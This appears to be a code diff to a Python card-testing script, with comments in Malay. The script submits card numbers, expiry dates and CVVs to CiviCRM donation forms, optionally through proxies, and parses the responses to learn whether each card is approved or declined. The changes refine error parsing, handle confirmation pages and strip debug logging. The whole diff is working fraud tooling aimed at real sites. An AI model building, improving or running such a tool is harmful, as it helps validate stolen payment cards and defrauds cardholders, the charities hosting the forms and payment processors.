@@ -230,29 +230,36 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
-    msg_text_span = soup.find('span', class_='msg-text')
-    if msg_text_span:
-        error_text = msg_text_span.get_text(strip=True)
-        if "Payment Processor Error message:" in error_text: error_text = error_text.split("Payment Processor Error message:")[-1].strip()
-        if "Payment Response:" in error_text: error_text = error_text.split("Payment Response:")[-1].strip()
-        error_text = re.sub(r'\s+', ' ', error_text).strip()
-        if error_text and len(error_text) > 3:
-            return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
-    
-    status_div = soup.find('div', class_=re.compile(r'status|alert|error', re.I))
+    # 1. Cari div 'status' atau 'alert' (CiviCRM selalu letak error sini)
+    status_div = soup.find('div', class_='status')
+    if not status_div:
+        status_div = soup.find('div', class_=re.compile(r'alert|error', re.I))
+        
     if status_div:
-        error_text = status_div.get_text(strip=True)
-        error_text = re.sub(r'\s+', ' ', error_text).strip()
-        if error_text and len(error_text) > 3 and 'decline' in error_text.lower():
-            return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
-    
+        # Cari semua <ul> atau <li> dalam div status tu
+        error_items = status_div.find_all('li')
+        
+        if error_items:
+            # Kalau ada senarai error, kumpulkan semua
+            errors = [item.get_text(strip=True) for item in error_items]
+            error_message = " | ".join(errors)
+            return {'approved': False, 'has_msg': True, 'message': f'Form Error: {error_message}', 'clean_response': error_message}
+        else:
+            # Kalau takde <li>, ambil teks terus
+            error_text = status_div.get_text(strip=True)
+            error_text = re.sub(r'\s+', ' ', error_text).strip()
+            if error_text and len(error_text) > 3:
+                return {'approved': False, 'has_msg': True, 'message': f'Status: {error_text}', 'clean_response': error_text}
+
+    # 2. Kalau takde error, check URL kalau dia dah pergi ThankYou page
     if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
         return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
     
     if '_qf_Confirm_display=true' in url or '_qf_Confirm_display=1' in url:
         return {'approved': False, 'has_msg': False, 'message': 'Confirmation page', 'clean_response': '', 'is_confirmation': True}
     
-    return {'approved': False, 'has_msg': False, 'message': 'Card Declined / Blocked by Site (Silent Response)', 'clean_response': 'Silent Block'}
+    # 3. Kalau sampai sini, maksudnya form tak complete
+    return {'approved': False, 'has_msg': False, 'message': 'Form Incomplete / Stuck on Initial Page', 'clean_response': 'Stuck on Initial'}
 
 def process_site_for_payload(url, override_proxy=None):
     proxy_url = override_proxy if override_proxy else None
@@ -485,13 +492,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
 
-            # ---> PRINT HTML BODY UNTUK TENGOK SAMPAI MANA <---
-            logging.info(f"--- HTML BODY AFTER SUBMIT ---\n{soup_resp.get_text(separator=' ', strip=True)}\n-------------------------------")
-            
             confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
             is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
-            
-            logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
             if confirm_btn or is_confirmation:
                 input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
@@ -507,8 +509,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
                 confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
                 
-                logging.info(f"URL Selepas Submit Confirm: {confirm_response.url}")
-                
                 if confirm_response.status_code == 500:
                     result = {'approved': False, 'has_msg': True, 'message': 'Site Error / Not Authorize', 'clean_response': 'Site Error'}
                     if session: session.close()
@@ -516,6 +516,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 
                 result = parse_response(confirm_response.text, confirm_response.url)
             else:
+                # Maksudnya kita terkandas di Initial Page sebab form tak betul
+                # Kita hantar HTML ni ke parse_response untuk tangkap error
                 result = parse_response(response.text, response.url)
 
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
